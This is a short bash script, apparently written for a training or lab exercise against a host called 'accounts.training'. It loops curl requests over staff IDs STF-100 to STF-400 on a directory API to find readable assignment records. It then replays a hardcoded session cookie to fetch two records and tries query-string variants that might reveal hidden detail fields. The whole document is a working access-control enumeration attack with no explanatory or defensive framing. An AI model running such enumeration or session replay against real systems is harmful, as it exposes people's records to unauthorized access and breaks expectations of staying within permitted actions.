#!/bin/bash
H=accounts.training
S=VfVypNdOCy9v3nxKTpivD0xJWsyKfkEfWE2o3uOdC-c
echo "=== enumerate STF-1..STF-400 assignment ==="
for i in $(seq 100 400); do
  code=$(curl -s -o /tmp/o -w '%{http_code}' --max-time 5 "http://$H:8080/api/directory/staff/STF-$i/assignment")
  if [ "$code" != "404" ]; then echo "STF-$i -> $code $(head -c 300 /tmp/o)"; fi
done
echo "=== with session ==="
for i in 204 317; do
  echo "--- STF-$i"; curl -s -w ' [%{http_code}]\n' --max-time 10 -H "Cookie: CINDER_REHEARSAL_SESSION=$S" "http://$H:8080/api/directory/staff/STF-$i/assignment"
done
echo "=== assignment variants ==="
for q in '?revision=8' '?full=1' '?include=detail' '?staff_detail=1'; do
  echo "--- STF-204$q"; curl -s -w ' [%{http_code} %{size_download}]\n' --max-time 10 "http://$H:8080/api/directory/staff/STF-204/assignment$q"
done
